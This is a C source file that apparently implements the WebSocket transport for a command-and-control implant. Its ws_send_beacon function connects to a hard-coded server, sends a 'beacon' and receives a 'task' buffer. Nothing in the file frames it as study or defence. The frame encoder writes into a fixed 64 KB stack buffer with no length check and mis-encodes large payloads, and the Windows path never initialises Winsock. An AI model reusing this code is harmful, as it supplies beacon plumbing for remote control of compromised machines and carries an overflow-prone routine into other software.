#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#ifdef _WIN32
    #include <winsock2.h>
    typedef int socklen_t;
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

#define SERVER_IP   "127.0.0.1"
#define WS_PORT     8443

static int ws_handshake(int sock){
    char request[512];
    int len = snprintf(request, sizeof(request),
        "GET /ws HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n",
        SERVER_IP, WS_PORT);
    if (send(sock, request, len, 0)<0)return -1;

    char response[1024];
    int n = recv(sock, response, sizeof(response)-1,0);
    if(n<0)return -1;
    response[n] = 0;
    if(strstr(response, "101 Switching Protocols") == NULL) return -1;
    return 0;
}

static int ws_send(int sock, uint8_t *data, size_t len){
    uint8_t frame[65536];
    int pos = 0;
    frame[pos++] = 0x82;
    if(len<126){
        frame[pos++] = (uint8_t)(len | 0x80);
    }
    else{
        frame[pos++] = 126 | 0x80;
        frame[pos++] = (len >> 8) & 0xff;
        frame[pos++] = len & 0xff;

    }
    uint8_t mask[4] = {0x12, 0x34, 0x56,0x78};
    memcpy(frame + pos, mask, 4);
    pos += 4;
    for(size_t i=0;i<len;i++){
        frame[pos++] = data[i]^mask[i%4];
    }
    return send(sock, (const char*)frame, pos,0);
}

static int ws_recv(int sock, uint8_t *out, size_t out_len) {
    uint8_t header[10];
    int n = recv(sock, (char*)header,2, 0);
    if (n < 2) return -1;
    size_t payload_len = header[1] & 0x7f;
    if (payload_len == 126) {
        n = recv(sock, (char*)header + 2,2,0);
        if (n < 2) return -1;
        payload_len = ((size_t)header[2]<<8) | header[3];
    }
    if (payload_len > out_len) return -1;
    size_t received = 0;
    while (received < payload_len) {
        n = recv(sock, (char*)out + received,payload_len - received, 0);
        if (n <= 0) return -1;
        received += n;
    }
    return (int)received;
}

void ws_send_beacon(uint8_t *beacon, size_t beacon_len, uint8_t *task_out, size_t *task_len) {
    if (task_len) *task_len = 0;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(WS_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        goto cleanup;
    }
    if (ws_handshake(sock) < 0) {
        printf("WebSocket handshake failed\n");
        goto cleanup;
    }
    if (ws_send(sock, beacon, beacon_len) < 0) {
        printf("WebSocket send failed\n");
        goto cleanup;
    }
    if (task_out && task_len) {
        int n = ws_recv(sock, task_out, 4096);
        if (n > 0) *task_len = (size_t)n;
    }
cleanup:
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}